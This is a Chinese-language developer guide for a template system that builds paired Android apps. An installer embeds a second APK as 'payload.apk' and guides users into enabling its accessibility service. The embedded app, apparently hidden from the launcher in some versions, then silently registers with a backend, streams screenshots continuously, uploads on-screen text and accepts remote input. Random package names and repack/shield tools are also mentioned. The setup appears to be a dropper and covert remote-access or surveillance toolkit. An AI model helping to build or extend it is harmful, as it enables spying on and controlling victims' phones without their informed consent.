# APK 模板位置与开发指南

## 1. 统一模板目录

项目根目录是 `/Users/xxx/Documents/code/yuankon`。当前模板按 B 包、A 包和独立包分组：

- `android/apk-templates/b-packages/screenagent-1.7.4/`：当前 B 包测试端；保留自动上线、租约、六个固定快捷操作、焦点文本发送和节点 text/content_description 上报，提供桌面页面按钮切换 MediaProjection 与 AccessibilityService.takeScreenshot 两种截图模式。`screenagent-1.0`–`1.4` 已删除，兼容目录保留 1.5、1.6、1.7、1.7.1、1.7.2、1.7.3。
- `android/apk-templates/a-packages/installer-1.2/`：当前 A 包桌面安装器；未安装 B 包时只显示一个安装入口，安装成功返回后显示受限设置与无障碍引导，用户开启 B 包服务并返回后打开构建时设置的 HTTPS 内置浏览器首页。完成首次引导后，检测到 B 包已安装便直接打开首页。`installer-1.0/1.1` 保留为旧版。
- `android/apk-templates/standalone/browser-1.0/`：原 android-shell 浏览器源码，不参与 A/B 依赖关系。

`android/apk-templates/templates.json` 是后台版本清单；`sourceDir` 相对此清单所在目录。这样目录里放的就是模板源码，不再只有配置文件。完整约定见 [模板指南](android/apk-templates/README.md)。

Vue 前端在 `frontend/src/`；Node 服务器在 `backend/src/`。手机不是 Vue 页面封装：浏览器模板为 Java + WebView，ScreenAgent 为 Kotlin 原生应用。

## 2. 新增后续模板

在项目根目录执行；先确认目标目录不存在：

```bash
cp -R android/apk-templates/b-packages/screenagent-1.7.4 android/apk-templates/b-packages/screenagent-1.8
```

修改新目录中的功能，再往 `android/apk-templates/templates.json` 数组追加：

```json
{
  "id": "screenagent-1.8",
  "name": "v1.8 · ScreenAgent 新能力",
  "versionName": "1.8.0",
  "versionCode": 9,
  "sourceDir": "b-packages/screenagent-1.8",
  "kind": "screenagent",
  "visibleLauncher": false,
  "description": "填写此版本实际新增的功能。"
}
```

保存后刷新构建页。也可采用 `screenshot-1.1` 等清晰的英文目录名，和 sourceDir 一致即可。`kind` 支持 `browser`、`screenagent`、`installer`；新增构建结构需先增加适配和测试。

**通常版本升级保留旧目录。** 本次按明确要求删除 1.0–1.4，保留 1.5/1.6/1.7/1.7.1/1.7.2/1.7.3 并新增 1.7.4。安装包升级需相同 applicationId/签名、提高 versionCode；随机包名是独立应用。当前功能模板为 1.7.4，不把改标题当作实现更高版本功能。

## 3. 在哪里改功能

| 功能 | 相对模板目录的路径 |
|---|---|
| 名称 | `app/src/main/res/values/strings.xml` 的 app_name |
| 浏览器主页、导航 | `app/src/main/java/dev/boundarylab/browser/MainActivity.java`、strings.xml 的 home_url |
| 浏览器开关状态引导 | `AccessibilitySetup.java`、`ResearchAccessibilityService.java` 与 res/xml 配置 |
| ScreenAgent 自动上线/凭证 | `net/DeviceSession.kt`、`net/HttpUploader.kt`、后台 `device-ingress.js` |
| ScreenAgent 屏幕共享确认 | `ProjectionActivity.kt`、`capture/ProjectionCaptureService.kt` |
| ScreenAgent VirtualDisplay 与最新帧 | `capture/ProjectionController.kt`、`accessibility/BoundaryAccessibilityService.kt` |
| ScreenAgent 运行配置 | `app/src/main/assets/agent_config.json` |
| 权限与组件声明 | `app/src/main/AndroidManifest.xml` |
| 版本、SDK、包名属性 | `app/build.gradle` 或 `app/build.gradle.kts` |

安装包名与 namespace / Java / Kotlin 包路径分开，不全局替换源码包名。网页构建在独立私有副本中写入转义后的资源/JSON，包名和版本走白名单 Gradle 属性；不修改原模板。

ScreenAgent 1.7.4 有桌面入口测试页，两个按钮分别选择 MediaProjection 模式和 takeScreenshot 模式。MediaProjection 模式会调用 `createScreenCaptureIntent()` 并由用户在 Android 系统对话框确认，随后前台服务创建 `VirtualDisplay` 与 `ImageReader`；takeScreenshot 模式使用 `AccessibilityService.takeScreenshot`，无障碍配置把 `canTakeScreenshot` 设为 `true`。网页查看、六个固定快捷操作和 `TEXT_INPUT` 只在有效租约内工作；两种截图模式都在上一帧上传完成后立即继续取下一帧，失败时短暂重试。

## 4. 构建与产物

```bash
npm run build:apk
npm run build:screenagent
```

命令从根目录执行，脚本在 `android/scripts/`。CLI 每次新建 `android/dist/browser-template-*/` 或 `android/dist/screenagent-*/`，复制源码、离线编译/Lint、验证签名及对齐、计算 SHA-256。不覆盖旧产物，不向手机安装。

网页 [构建中心](http://127.0.0.1:8080/builds) 先选择 B 包版本并构建，再选择 A 包版本构建。B 包接收后台域名、APP 名、可选 APK ID/批次/包名，不接收首页；A 包接收名称、HTTPS 首页地址和包名。服务端按同项目、同归属账号选取最新成功且文件仍存在的 B 包，固定记录 B 构建 ID、SHA-256 与包名。没有可用 B 包时 A 包返回 409；两者包名相同时返回 422。A 包构建副本写入 `assets/payload.apk` 和带首页地址的 `installer_config.json`，并在复制前校验摘要。A 包 1.1 启动时先按内置 B 包包名检查工作端：未安装时只显示「安装 B 包」并调用系统安装确认；本次安装成功返回后显示无障碍说明和「打开无障碍」按钮，只有用户点击才进入 Android 系统无障碍页面；检测到 B 包服务已开启并返回后显示 WebView。完成首次引导后，只要检测到 B 包已安装就直接进入 WebView，不再提供「打开首页」或「打开 B 包设置」按钮。B 包 1.7.4 有 MAIN/LAUNCHER 模式选择页；1.7.2 与更早兼容 B 包没有 MAIN/LAUNCHER。1.7.4 不申请发送通知权限，MediaProjection 模式仍需要用户确认 Android 系统屏幕共享，takeScreenshot 模式不启动屏幕共享。模板清单的 `visibleLauncher` 决定 B 包入口断言，A 包始终必须有桌面入口，真实构建在 `aapt badging` 阶段强制校验。产物在 `backend/.node-private/files/apk-builds/<UUID>/application.apk`；详细日志在 `backend/.node-private/build-work/<UUID>/build.log`，构建记录可鉴权下载，包含 Gradle/Lint、签名、对齐、包信息、摘要及产物保存步骤。完成或失败的记录可在列表确认后删除，服务端同时永久删除该 UUID 的记录、APK 目录与构建日志目录；排队中或构建中的任务不可删除，B 包正被活动 A 包使用时也不可删除。

工具链在 `android/.local-tools/`：JDK 17、Gradle 8.11.1、AGP 8.9.2、Android API 35。全新 Linux 服务器在 `/install` 第一步点击「安装构建环境」，服务端会校验固定下载、安装 SDK 组件、逐个预编译登记模板并生成离线依赖缓存；也可运行 `npm run install:android-env` 执行同一脚本。安装需要至少 6 GiB 可用空间，进度日志和完成锁位于 `backend/.node-private/`。支持 JAVA_HOME、ANDROID_HOME、GRADLE、GRADLE_USER_HOME、ANDROID_USER_HOME；显式环境变量优先。开发签名、下载文件和缓存不进 Git。

## 5. 域名、归属与其他目录

- 首页 URL 只属于 A 包；后台域名只属于 B 包，二者独立。B 包 1.7.4 有模式选择页；MediaProjection 的屏幕共享确认仍由 Android 系统界面完成。
- 构建中心的后台域名默认读取当前页面的 `window.location.origin`，包含协议与端口（例如 `https://yk1.jk92.cc`），不包含页面路径；用户仍可手动修改，轮询不会覆盖填写值。`local` 仍可选用，解析为服务端配置的地址；域名简称在 `android/apk-templates/domains.json` 映射到真实 HTTPS 地址，保存配置不等于部署域名。
- APK ID 在创建账号的事务中自动分配，一个账号一个固定编号；不是账号凭证。构建填写有效编号归属对应账号，留空或未匹配可用账号时使用默认接收账号的编号（当前为超管）。构建记录显示实际编号、接收账号与匹配结果，不因构建创建新编号。构建 UUID 表示一次任务，没有总台 AppID。
- 当前 B 包不需要手机输入登记码。无障碍服务连接后自动提交内置 APK ID，服务器按 `accounts.apk_id` 确定账号并静默签发内部设备 Token；旧登记接口只兼容旧版 B 包。
- `android/installer/`、`android/apk-repack/`、`android/apk-shield/` 是保留的独立工具，未纳入网页模板队列。
- `android/inputs/` 保留原有输入 APK；`android/dist/` 是 CLI 产物。两者不是主源码。

## 6. 验收清单

- 修改版本模板，而非一次性构建副本；登记正确的版本与源码目录。
- 执行 `npm run check`、`npm run test:e2e`；模板或构建脚本变更后真实打包、Lint、校验签名/包名/版本/资源。
- 在登记的测试手机安装后检查启动、确认、停止、返回、旋转、断网等；不把编译或下载成功等同真机成功。
- 提交前排除 node_modules、.node-private、.local-tools、dist、APK、密钥与缓存。

相关：[ScreenAgent 接入](backend/docs/SCREENAGENT_INGRESS.md) · [构建说明](backend/docs/BUILD_BOT.md) · [目录迁移](backend/docs/DIRECTORY_LAYOUT.md)。

1.7.4：开启无障碍与服务重连均不请求 MediaProjection；只在桌面页点击按钮后经进程内单次点击票据校验打开系统授权。页面显示 BuildConfig 版本便于核对实际安装包；取消授权不重试，切换 takeScreenshot 撤销待用票据并停止共享。保留 1.7.3 历史模板。
